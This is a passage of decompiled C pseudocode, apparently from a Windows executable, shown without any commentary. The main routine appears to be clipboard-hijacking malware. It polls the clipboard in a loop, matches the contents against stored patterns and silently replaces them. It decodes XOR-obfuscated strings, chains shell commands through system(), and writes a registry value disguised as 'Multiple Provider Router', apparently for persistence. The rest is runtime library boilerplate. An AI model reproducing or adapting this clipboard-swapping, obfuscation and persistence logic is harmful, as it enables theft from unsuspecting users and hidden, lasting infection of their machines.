           0x1f < (ulonglong)((longlong)local_3f0._0_8_ + (-8 - (longlong)pvVar14)))) {
                    // WARNING: Subroutine does not return
          _invalid_parameter_noinfo_noreturn();
        }
        free(pvVar14);
      }
      local_3e0._0_12_ = ZEXT412(7) << 0x40;
      local_3e0 = ZEXT1216(local_3e0._0_12_);
      local_3f0 = local_3f0 & (undefined  [16])0xffffffffffff0000;
      FUN_14000b774(local_298);
      uVar12 = 0;
      local_3f8 = 0xe0c117c;
      local_3f4 = (ushort)local_3f4._1_1_ << 8;
      do {
        pbVar1 = (byte *)((longlong)&local_3f8 + uVar12 + 1);
        *pbVar1 = *pbVar1 ^ 0x7c;
        uVar12 = uVar12 + 1;
      } while (uVar12 < 3);
      local_3f4 = (ushort)local_3f4._1_1_ << 8;
      CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,0,(LPCSTR)((longlong)&local_3f8 + 1));
      do {
        do {
          do {
            Sleep(0x14);
            DVar7 = GetClipboardSequenceNumber();
          } while (_DAT_1400177c0 == DVar7);
          BVar5 = OpenClipboard((HWND)0x0);
        } while (BVar5 == 0);
        FUN_140006d18((undefined (*) [16])&local_3a0);
        if (((char)local_380 == '\0') ||
           ((undefined *)CONCAT44(uStack908,local_390) == (undefined *)0x0)) {
          FUN_14000774c();
        }
        else {
          puVar16 = (undefined8 *)&local_3a0;
          local_3f0 = extraout_XMM0_01 & (undefined  [16])0x0;
          if (0xf < CONCAT44(uStack900,uStack904)) {
            puVar16 = (undefined8 *)CONCAT44(uStack924,local_3a0);
          }
          local_3e0 = local_3e0 & (undefined  [16])0xffffffffffffffff;
          FUN_140001e44((void **)local_3f0,puVar16,(undefined *)CONCAT44(uStack908,local_390));
          plVar10 = DAT_1400177d0;
          for (plVar17 = DAT_1400177c8; plVar17 != plVar10; plVar17 = plVar17 + 9) {
            if (plVar17[7] != 0) {
              _Src = FUN_140004c14((undefined (*) [16])local_198,(undefined8 *)local_3f0,plVar17,
                                   plVar17 + 5,0);
              if ((undefined (*) [16])local_3f0 != _Src) {
                if (0xf < local_3e0._8_8_) {
                  pvVar14 = local_3f0._0_8_;
                  if ((0xfff < local_3e0._8_8_ + 1) &&
                     (pvVar14 = *(void **)((longlong)local_3f0._0_8_ + -8),
                     0x1f < (ulonglong)((longlong)local_3f0._0_8_ + (-8 - (longlong)pvVar14))))
                  goto LAB_14000e285;
                  free(pvVar14);
                }
                local_3e0 = ZEXT816(0xf) << 0x40;
                local_3f0 = local_3f0 & (undefined  [16])0xffffffffffffff00;
                memcpy(local_3f0,_Src,0x20);
                *(undefined8 *)_Src[1] = 0;
                *(undefined8 *)(_Src[1] + 8) = 0xf;
                (*_Src)[0] = 0;
              }
              if (0xf < local_180) {
                pvVar14 = local_198[0];
                if ((0xfff < local_180 + 1) &&
                   (pvVar14 = *(void **)((longlong)local_198[0] + -8),
                   0x1f < (ulonglong)((longlong)local_198[0] + (-8 - (longlong)pvVar14)))) {
LAB_14000e285:
                    // WARNING: Subroutine does not return
                  _invalid_parameter_noinfo_noreturn();
                }
                free(pvVar14);
              }
              uVar12 = FUN_140001a34((undefined8 *)local_3f0,(undefined8 *)&local_3a0);
              if ((char)uVar12 != '\0') {
                _Dst = GlobalAlloc(0,local_3e0._0_8_ + 1);
                if (_Dst != (HGLOBAL)0x0) {
                  local_3f0._0_8_ = (ushort *)local_3f0;
                  if (0xf < local_3e0._8_8_) {
                  }
                  memcpy(_Dst,local_3f0._0_8_,local_3e0._0_8_ + 1);
                  EmptyClipboard();
                  SetClipboardData(1,_Dst);
                }
                break;
              }
            }
          }
          FUN_14000774c();
          if (0xf < local_3e0._8_8_) {
            pvVar14 = local_3f0._0_8_;
            if ((0xfff < local_3e0._8_8_ + 1) &&
               (pvVar14 = *(void **)((longlong)local_3f0._0_8_ + -8),
               0x1f < (ulonglong)((longlong)local_3f0._0_8_ + (-8 - (longlong)pvVar14)))) {
                    // WARNING: Subroutine does not return
              _invalid_parameter_noinfo_noreturn();
            }
            free(pvVar14);
          }
          local_3e0 = ZEXT816(0xf) << 0x40;
          local_3f0 = local_3f0 & (undefined  [16])0xffffffffffffff00;
        }
        if ((char)local_380 != '\0') {
          FUN_140006980((void **)&local_3a0,0);
        }
      } while( true );
    }
    FUN_14000551c(local_4f8,1);
    local_318 = 0x41545320;
    uStack788 = 0x43005452;
    uStack784 = 0xf00444d;
    uStack780 = 0x630f0071;
    local_2ef = 0;
    local_308 = 0x50000200;
    uStack772 = 0x474e49;
    uStack768 = 0x41434f4c;
    uStack764 = 0x534f484c;
    local_2f8 = 0x4e0d0054;
    local_2f4 = 0x6001100;
    local_2f0 = 6;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_318 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x20;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 0x29);
    local_2ef = local_2ef & 0xff;
    plVar10 = FUN_1400018c8(&local_4e8,(char *)((longlong)&local_318 + 1));
    local_3c8 = 0x100f0360;
    local_3c4 = 0x424019;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_3c8 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x60;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 6);
    local_3c4 = local_3c4 & 0xffffff;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_3c8 + 1));
    local_588[0] = local_2e8;
    if (7 < local_2d0) {
      local_588[0] = local_2e8[0];
    }
    FUN_1400024ac((undefined (*) [16])local_178,(undefined4 *)local_588);
    plVar10 = FUN_1400018b4(plVar10,local_178);
    plVar10 = FUN_1400018c8(plVar10,"\" \"");
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1392 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_578 = (undefined *)local_3f0._0_8_;
    FUN_1400024ac((undefined (*) [16])&local_1d8,(undefined4 *)&local_578);
    plVar10 = FUN_1400018b4(plVar10,&local_1d8);
    plVar10 = FUN_1400018c8(plVar10,"\" && ");
    local_378 = 0x65657011;
    uStack884 = 0x31737863;
    uStack880 = 0x3a31633a;
    uStack876 = 0x703a3179;
    local_368 = 0x3331;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_378 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x11;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 0x11);
    local_366 = 0;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_378 + 1));
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1376 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_568 = (undefined *)local_3f0._0_8_;
    FUN_1400024ac((undefined (*) [16])&local_1f8,(undefined4 *)&local_568);
    plVar10 = FUN_1400018b4(plVar10,&local_1f8);
    plVar10 = FUN_1400018c8(plVar10,"\" && ");
    local_3b0 = 0x72707a13;
    local_3ac = 0x33607f70;
    local_3a8 = 0x31;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_3b0 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x13;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 8);
    local_3a8 = local_3a8 & 0xff;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_3b0 + 1));
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1360 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_558 = (undefined *)local_3f0._0_8_;
    FUN_1400024ac((undefined (*) [16])&local_218,(undefined4 *)&local_558);
    plVar10 = FUN_1400018b4(plVar10,&local_218);
    local_3a0 = 0x69666446;
    uStack924 = 0x3f282322;
    uStack920 = 0x30236466;
    uStack916 = 0x293f3423;
    local_380 = 0x60666f07;
    local_390 = 0x7c642328;
    uStack908 = 0x6a02116e;
    uStack904 = 0x116a0207;
    uStack900 = 0x116a0703;
    local_37c = 0x6660;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_3a0 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x46;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 0x25);
    local_37a = 0;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_3a0 + 1));
    uVar8 = 0;
    local_3f8 = 0x3f363753;
    local_3f4 = 0x7173;
    do {
      pbVar1 = (byte *)((longlong)&local_3f8 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x53;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 5);
    local_3f2 = 0;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_3f8 + 1));
    local_548[0] = local_2e8;
    if (7 < local_2d0) {
      local_548[0] = local_2e8[0];
    }
    FUN_1400024ac((undefined (*) [16])&local_238,(undefined4 *)local_548);
    plVar10 = FUN_1400018b4(plVar10,&local_238);
    plVar10 = FUN_1400018c8(plVar10,"\" && ");
    local_330 = 0x5e57593a;
    uStack812 = 0x1a79151a;
    uStack808 = 0x5b4e4918;
    uStack804 = 0x181a4e48;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_330 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x3a;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 0xf);
    local_320 = 0;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_330 + 1));
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1328 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_538 = (undefined *)local_3f0._0_8_;
    FUN_1400024ac((undefined (*) [16])&local_258,(undefined4 *)&local_538);
    plVar10 = FUN_1400018b4(plVar10,&local_258);
    local_2c8 = 0x52545674;
    uStack708 = 0xc115452;
    uStack704 = 0x5456001d;
    uStack700 = 0x545252;
    uVar8 = uVar12;
    do {
      pbVar1 = (byte *)((longlong)&local_2c8 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 0x74;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 0xe);
    uStack700 = uStack700 & 0xffffff;
    plVar10 = FUN_1400018c8(plVar10,(char *)((longlong)&local_2c8 + 1));
    FUN_1400018c8(plVar10," && exit \"");
    if (0xf < CONCAT44(uStack572,uStack576)) {
      pvVar2 = (void *)CONCAT71(local_258._1_7_,(undefined)local_258);
      pvVar14 = pvVar2;
      if ((0xfff < CONCAT44(uStack572,uStack576) + 1) &&
         (pvVar14 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar14)))) goto LAB_14000dc59;
      free(pvVar14);
    }
    local_258._0_1_ = 0;
    local_248 = 0;
    uStack580 = 0;
    uStack576 = 0xf;
    uStack572 = 0;
    if (0xf < CONCAT44(uStack540,uStack544)) {
      pvVar2 = (void *)CONCAT71(local_238._1_7_,(undefined)local_238);
      pvVar14 = pvVar2;
      if ((0xfff < CONCAT44(uStack540,uStack544) + 1) &&
         (pvVar14 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar14)))) goto LAB_14000dc59;
      free(pvVar14);
    }
    local_238._0_1_ = 0;
    local_228 = 0;
    uStack548 = 0;
    uStack544 = 0xf;
    uStack540 = 0;
    if (0xf < CONCAT44(uStack508,uStack512)) {
      pvVar2 = (void *)CONCAT71(local_218._1_7_,(undefined)local_218);
      pvVar14 = pvVar2;
      if ((0xfff < CONCAT44(uStack508,uStack512) + 1) &&
         (pvVar14 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar14)))) goto LAB_14000dc59;
      free(pvVar14);
    }
    local_218._0_1_ = 0;
    local_208 = 0;
    uStack516 = 0;
    uStack512 = 0xf;
    uStack508 = 0;
    if (0xf < CONCAT44(uStack476,uStack480)) {
      pvVar2 = (void *)CONCAT71(local_1f8._1_7_,(undefined)local_1f8);
      pvVar14 = pvVar2;
      if ((0xfff < CONCAT44(uStack476,uStack480) + 1) &&
         (pvVar14 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar14)))) goto LAB_14000dc59;
      free(pvVar14);
    }
    local_1f8._0_1_ = 0;
    local_1e8 = 0;
    uStack484 = 0;
    uStack480 = 0xf;
    uStack476 = 0;
    if (0xf < CONCAT44(uStack444,uStack448)) {
      pvVar2 = (void *)CONCAT71(local_1d8._1_7_,(undefined)local_1d8);
      pvVar14 = pvVar2;
      if ((0xfff < CONCAT44(uStack444,uStack448) + 1) &&
         (pvVar14 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar14)))) goto LAB_14000dc59;
      free(pvVar14);
    }
    local_1d8._0_1_ = 0;
    local_1c8 = 0;
    uStack452 = 0;
    uStack448 = 0xf;
    uStack444 = 0;
    if (0xf < local_160) {
      pvVar14 = local_178[0];
      if ((0xfff < local_160 + 1) &&
         (pvVar14 = *(void **)((longlong)local_178[0] + -8),
         0x1f < (ulonglong)((longlong)local_178[0] + (-8 - (longlong)pvVar14)))) {
LAB_14000dc59:
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pvVar14);
    }
    local_360 = 0xe071b48;
    uStack860 = 0x1a091f1c;
    uStack856 = 0x2105140d;
    uStack852 = 0x3b273a2b;
    local_350 = 0x143c2e27;
    uStack844 = 0x2c26211f;
    uStack840 = 0x143b3f27;
    uStack836 = 0x3a3a3d0b;
    local_5a8[0] = (HKEY)0x0;
    local_340 = 0x1e3c262d;
    local_33c = 0x213b3a2d;
    local_338 = 0x1a142627;
    local_334 = 0x263d;
    do {
      pbVar1 = (byte *)((longlong)&local_360 + uVar12 + 1);
      *pbVar1 = *pbVar1 ^ 0x48;
      uVar12 = uVar12 + 1;
    } while (uVar12 < 0x2d);
    local_332 = 0;
    RegCreateKeyA((HKEY)0xffffffff80000001,(LPCSTR)((longlong)&local_360 + 1),local_5a8);
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1312 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_528 = (undefined *)local_3f0._0_8_;
    FUN_1400024ac((undefined (*) [16])&local_158,(undefined4 *)&local_528);
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1296 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_518 = (undefined *)local_3f0._0_8_;
    FUN_1400024ac((undefined (*) [16])&local_2b8,(undefined4 *)&local_518);
    lpData = &local_2b8;
    if (0xf < CONCAT44(uStack668,uStack672)) {
      lpData = (BYTE *)CONCAT71(uStack695,local_2b8);
    }
    RegSetValueExA(local_5a8[0],"Multiple Provider Router",0,1,lpData,local_148 + 1);
    if (0xf < CONCAT44(uStack668,uStack672)) {
      pvVar2 = (void *)CONCAT71(uStack695,local_2b8);
      pvVar14 = pvVar2;
      if ((0xfff < CONCAT44(uStack668,uStack672) + 1) &&
         (pvVar14 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar14)))) goto LAB_14000de3f;
      free(pvVar14);
    }
    local_2b8 = '\0';
    local_2a8 = 0;
    uStack676 = 0;
    uStack672 = 0xf;
    uStack668 = 0;
    if (0xf < local_140) {
      pvVar14 = local_158;
      if ((0xfff < local_140 + 1) &&
         (pvVar14 = *(void **)((longlong)local_158 + -8),
         0x1f < (ulonglong)((longlong)local_158 + (-8 - (longlong)pvVar14)))) {
LAB_14000de3f:
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pvVar14);
    }
    FUN_14000ce78((longlong)local_4e0,(undefined (*) [16])local_1b8);
    ppppuVar13 = local_1b8;
    if (0xf < local_1a0) {
      ppppuVar13 = local_1b8[0];
    }
    system((char *)ppppuVar13);
    if (0xf < local_1a0) {
      ppppuVar13 = local_1b8[0];
      if ((0xfff < local_1a0 + 1) &&
         (ppppuVar13 = (undefined8 ****)local_1b8[0][-1],
         (char *)0x1f < (char *)((longlong)local_1b8[0] + (-8 - (longlong)ppppuVar13)))) {
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(ppppuVar13);
    }
    FUN_1400061e4((longlong)local_460);
    std::basic_ios<char,struct_std::char_traits<char>_>::
    _basic_ios_char_struct_std__char_traits_char___(local_460);
    FUN_14000b774(local_2e8);
    if (7 < local_3e0._8_8_) {
      pvVar14 = local_3f0._0_8_;
      if ((0xfff < local_3e0._8_8_ * 2 + 2) &&
         (pvVar14 = *(void **)((longlong)local_3f0._0_8_ + -8),
         0x1f < (ulonglong)((longlong)local_3f0._0_8_ + (-8 - (longlong)pvVar14)))) {
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pvVar14);
    }
    local_3e0._0_12_ = ZEXT412(7) << 0x40;
    local_3e0 = ZEXT1216(local_3e0._0_12_);
    local_3f0 = local_3f0 & (undefined  [16])0xffffffffffff0000;
    FUN_14000b774(local_298);
  }
LAB_14000d2a2:
  FUN_14000eed0(local_28 ^ (ulonglong)auStackY1512);
  return;
}



// WARNING: Unknown calling convention yet parameter storage is locked

void std::_Xbad_alloc(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000e2a9. Too many branches
                    // WARNING: Treating indirect jump as call
  _Xbad_alloc();
  return;
}



// WARNING: Unknown calling convention yet parameter storage is locked

void std::_Xlength_error(char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00014000e2af. Too many branches
                    // WARNING: Treating indirect jump as call
  _Xlength_error(param_1);
  return;
}



// WARNING: Unknown calling convention yet parameter storage is locked

void std::_Xout_of_range(char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00014000e2b5. Too many branches
                    // WARNING: Treating indirect jump as call
  _Xout_of_range(param_1);
  return;
}



ulonglong FUN_14000e2bc(DWORD param_1,longlong *param_2)

{
  int iVar1;
  DWORD DVar2;
  ulonglong uVar3;
  byte *pbVar4;
  uint local_res18 [4];
  
  iVar1 = GetLocaleInfoEx(L"!x-sys-default-locale",0x20000001,(LPWSTR)local_res18,2);
  local_res18[0] = -(uint)(iVar1 != 0) & local_res18[0];
  DVar2 = FormatMessageA(0x1300,(LPCVOID)0x0,param_1,local_res18[0],(LPSTR)param_2,0,(va_list *)0x0)
  ;
  uVar3 = (ulonglong)DVar2;
  if (DVar2 != 0) {
    pbVar4 = (byte *)(*param_2 + -1 + uVar3);
    do {
      if ((&DAT_140012330)[*pbVar4] == '\0') {
        return uVar3;
      }
      pbVar4 = pbVar4 + -1;
      uVar3 = uVar3 - 1;
    } while (uVar3 != 0);
  }
  return uVar3;
}



HLOCAL LocalFree(HLOCAL hMem)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e350. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalFree(hMem);
  return pvVar1;
}



// WARNING: Unknown calling convention yet parameter storage is locked

bool std::uncaught_exception(void)

{
  bool bVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e357. Too many branches
                    // WARNING: Treating indirect jump as call
  bVar1 = uncaught_exception();
  return bVar1;
}



void _Query_perf_counter(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000e35d. Too many branches
                    // WARNING: Treating indirect jump as call
  _Query_perf_counter();
  return;
}



void _Query_perf_frequency(void)

{
                    // WARNING: Could not recover jumptable at 0x00014000e363. Too many branches
                    // WARNING: Treating indirect jump as call
  _Query_perf_frequency();
  return;
}



// WARNING: Unknown calling convention yet parameter storage is locked

char * std::_Syserror_map(int param_1)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e369. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = _Syserror_map(param_1);
  return pcVar1;
}



// WARNING: Unknown calling convention yet parameter storage is locked

int std::_Winerror_map(int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e36f. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _Winerror_map(param_1);
  return iVar1;
}



// WARNING: Unknown calling convention yet parameter storage is locked
// Library Function - Single Match
//  void __cdecl std::_Facet_Register(class std::_Facet_base * __ptr64)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void std::_Facet_Register(_Facet_base *param_1)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)operator_new(0x10);
  if (puVar1 != (undefined8 *)0x0) {
    *puVar1 = DAT_1400177f8;
    puVar1[1] = param_1;
  }
  DAT_1400177f8 = puVar1;
  return;
}



int _Strcoll(char *param_1,char *param_2,char *param_3,char *param_4,_Collvec *param_5)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e3b0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _Strcoll(param_1,param_2,param_3,param_4,param_5);
  return iVar1;
}



size_t _Strxfrm(char *_String1,char *_End1,char *param_3,char *param_4,_Collvec *param_5)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e3b6. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = _Strxfrm(_String1,_End1,param_3,param_4,param_5);
  return sVar1;
}



// WARNING: Unknown calling convention yet parameter storage is locked

_Locimp * std::locale::_Init(bool param_1)

{
  _Locimp *p_Var1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e3c2. Too many branches
                    // WARNING: Treating indirect jump as call
  p_Var1 = _Init(param_1);
  return p_Var1;
}



// WARNING: Unknown calling convention yet parameter storage is locked

_Locimp * std::locale::_Getgloballocale(void)

{
  _Locimp *p_Var1;
  
                    // WARNING: Could not recover jumptable at 0x00014000e3c8. Too many branches
                    // WARNING: Treating indirect jump as call
  p_Var1 = _Getgloballocale();
  return p_Var1;
}



ulonglong FUN_14000e3d0(void)

{
  UINT UVar1;
  BOOL BVar2;
  ulonglong uVar3;
  
  UVar1 = ___lc_codepage_func();
  uVar3 = 0xfde9;
  if (UVar1 != 0xfde9) {
    BVar2 = AreFileApisANSI();
    uVar3 = (ulonglong)(BVar2 == 0);
  }
  return uVar3;
}



// Library Function - Single Match
//  __std_fs_convert_narrow_to_wide
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

undefined8
__std_fs_convert_narrow_to_wide(UINT param_1,LPCSTR param_2,int param_3,LPWSTR param_4,int param_5)

{
  int iVar1;
  DWORD DStack20;
  
  iVar1 = MultiByteToWideChar(param_1,8,param_2,param_3,param_4,param_5);
  if (iVar1 == 0) {
    DStack20 = GetLastError();
  }
  else {
    DStack20 = 0;
  }
  return CONCAT44(DStack20,iVar1);
}



// Library Function - Single Match
//  __std_fs_convert_wide_to_narrow
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

undefined8
__std_fs_convert_wide_to_narrow(UINT param_1,LPCWSTR param_2,int param_3,LPSTR param_4,int param_5)

{
  int local_res8 [2];
  int local_28;
  DWORD DStack36;
  
  if ((param_1 == 0xfde9) || (param_1 == 0xd698)) {
    local_28 = WideCharToMultiByte(param_1,0x80,param_2,param_3,param_4,param_5,(LPCSTR)0x0,
                                   (LPBOOL)0x0);
  }
  else {
    local_res8[0] = 0;
    local_28 = WideCharToMultiByte(param_1,0x400,param_2,param_3,param_4,param_5,(LPCSTR)0x0,
                                   local_res8);
    if (local_res8[0] != 0) {
      local_28 = 0;
      DStack36 = 0x459;
      goto LAB_14000e546;
    }
  }
  if (local_28 == 0) {
    DStack36 = GetLastError();
  }
  else {
    DStack36 = 0;
  }
  if (DStack36 == 0x3ec) {
    local_28 = WideCharToMultiByte(param_1,0,param_2,param_3,param_4,param_5,(LPCSTR)0x0,(LPBOOL)0x0
                                  );
    if (local_28 == 0) {
      DStack36 = GetLastError();
    }
    else {
      DStack36 = 0;
    }
  }
LAB_14000e546:
  return CONCAT44(DStack36,local_28);
}



undefined8 FUN_14000e564(UINT param_1,LPCWSTR param_2,int param_3,LPSTR param_4,int param_5)

{
  int local_18;
  DWORD DStack20;
  
  local_18 = WideCharToMultiByte(param_1,0x400,param_2,param_3,param_4,param_5,(LPCSTR)0x0,
                                 (LPBOOL)0x0);
  if (local_18 == 0) {
    DStack20 = GetLastError();
  }
  else {
    DStack20 = 0;
  }
  if (DStack20 == 0x3ec) {
    local_18 = WideCharToMultiByte(param_1,0,param_2,param_3,param_4,param_5,(LPCSTR)0x0,(LPBOOL)0x0
                                  );
    if (local_18 == 0) {
      DStack20 = GetLastError();
    }
    else {
      DStack20 = 0;
    }
  }
  return CONCAT44(DStack20,local_18);
}



void FUN_14000e630(LPCWSTR param_1,ulonglong *param_2,uint param_3,uint param_4)

{
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  HANDLE pvVar4;
  uint uVar5;
  uint uVar6;
  undefined auStack712 [32];
  undefined8 local_2a8;
  uint local_2a0 [2];
  ulonglong local_298;
  undefined4 local_290;
  uint local_28c;
  undefined4 uStack648;
  DWORD local_284;
  uint local_280;
  _WIN32_FIND_DATAW local_278;
  ulonglong local_28;
  
  local_28 = DAT_140017038 ^ (ulonglong)auStack712;
  uVar5 = param_3 & 0xfffffffe;
  if (((param_3 & 1) == 0) || ((param_3 >> 2 & 1) == 0)) {
    if ((((param_3 >> 1 & 1) != 0) && (param_4 != 0xffffffff)) &&
       (((param_4 >> 10 & 1) == 0 || ((param_3 & 1) == 0)))) {
      uVar5 = param_3 & 0xfffffffc;
      *(uint *)(param_2 + 2) = param_4;
    }
    if (uVar5 == 0) goto LAB_14000e90e;
    if (((uVar5 & 0x2a) != 0) &&
       (((param_4 == 0xffffffff || ((param_4 >> 10 & 1) == 0)) || ((param_3 & 1) == 0)))) {
      BVar1 = GetFileAttributesExW(param_1,GetFileExInfoStandard,local_2a0);
      if (BVar1 == 0) {
        DVar2 = GetLastError();
        if (DVar2 != 0x20) goto LAB_14000e90e;
        pvVar4 = FindFirstFileW(param_1,&local_278);
        if (pvVar4 == (HANDLE)0xffffffffffffffff) {
          GetLastError();
          goto LAB_14000e90e;
        }
        FindClose(pvVar4);
        local_28c = (uint)local_278.ftLastWriteTime;
        uStack648 = (undefined4)(local_278.ftLastWriteTime >> 0x20);
      }
      else {
        local_278.ftLastWriteTime = CONCAT44(uStack648,local_28c);
        local_278.dwFileAttributes = local_2a0[0];
        local_278.nFileSizeHigh = local_284;
        local_278.nFileSizeLow = local_280;
      }
      if (((param_3 & 1) == 0) || ((local_278.dwFileAttributes >> 10 & 1) == 0)) {
        *(DWORD *)(param_2 + 2) = local_278.dwFileAttributes;
        param_2[1] = CONCAT44(local_278.nFileSizeHigh,local_278.nFileSizeLow);
        *param_2 = local_278.ftLastWriteTime & 0xffffffff00000000 | (ulonglong)local_28c;
        uVar5 = uVar5 & 0xffffffd5;
        if (uVar5 == 0) goto LAB_14000e90e;
      }
    }
    DVar2 = __std_fs_open_handle
                      ((HANDLE *)&local_2a8,param_1,0x80,(((byte)param_3 & 1 ^ 1) + 0x10) * 0x200000
                      );
    if (DVar2 == 0) {
      pvVar4 = (HANDLE)CONCAT44(local_2a8._4_4_,(undefined4)local_2a8);
      uVar6 = uVar5;
      if ((uVar5 & 0x26) != 0) {
        BVar1 = GetFileInformationByHandleEx(pvVar4,FileBasicInfo,local_2a0,0x28);
        if (BVar1 == 0) {
          GetLastError();
          if ((pvVar4 != (HANDLE)0xffffffffffffffff) && (BVar1 = CloseHandle(pvVar4), BVar1 == 0)) {
                    // WARNING: Subroutine does not return
            terminate();
          }
          goto LAB_14000e90e;
        }
        uVar6 = uVar5 & 0xffffffdd;
        *param_2 = CONCAT44(local_28c,local_290);
        *(uint *)(param_2 + 2) = local_280;
        if ((uVar6 >> 2 & 1) != 0) {
          if ((local_280 >> 10 & 1) == 0) {
            *(undefined4 *)((longlong)param_2 + 0x14) = 0;
          }
          else {
            BVar1 = GetFileInformationByHandleEx(pvVar4,FileAttributeTagInfo,&local_2a8,8);
            if (BVar1 == 0) {
              GetLastError();
              if ((pvVar4 != (HANDLE)0xffffffffffffffff) &&
                 (BVar1 = CloseHandle(pvVar4), BVar1 == 0)) {
                    // WARNING: Subroutine does not return
                terminate();
              }
              goto LAB_14000e90e;
            }
            *(undefined4 *)((longlong)param_2 + 0x14) = local_2a8._4_4_;
          }
          uVar6 = uVar5 & 0xffffffd9;
        }
      }
      if ((uVar6 & 0x18) != 0) {
        BVar1 = GetFileInformationByHandleEx(pvVar4,FileStandardInfo,local_2a0,0x18);
        if (BVar1 == 0) {
          GetLastError();
          if ((pvVar4 != (HANDLE)0xffffffffffffffff) && (BVar1 = CloseHandle(pvVar4), BVar1 == 0)) {
                    // WARNING: Subroutine does not return
            terminate();
          }
          goto LAB_14000e90e;
        }
        uVar6 = uVar6 & 0xffffffe7;
        param_2[1] = local_298;
        *(undefined4 *)(param_2 + 3) = local_290;
      }
      if (uVar6 != 0) {
        if ((pvVar4 == (HANDLE)0xffffffffffffffff) || (BVar1 = CloseHandle(pvVar4), BVar1 != 0))
        goto LAB_14000e90e;
        goto LAB_14000e948;
      }
      if (pvVar4 == (HANDLE)0xffffffffffffffff) goto LAB_14000e90e;
      iVar3 = CloseHandle(pvVar4);
    }
    else {
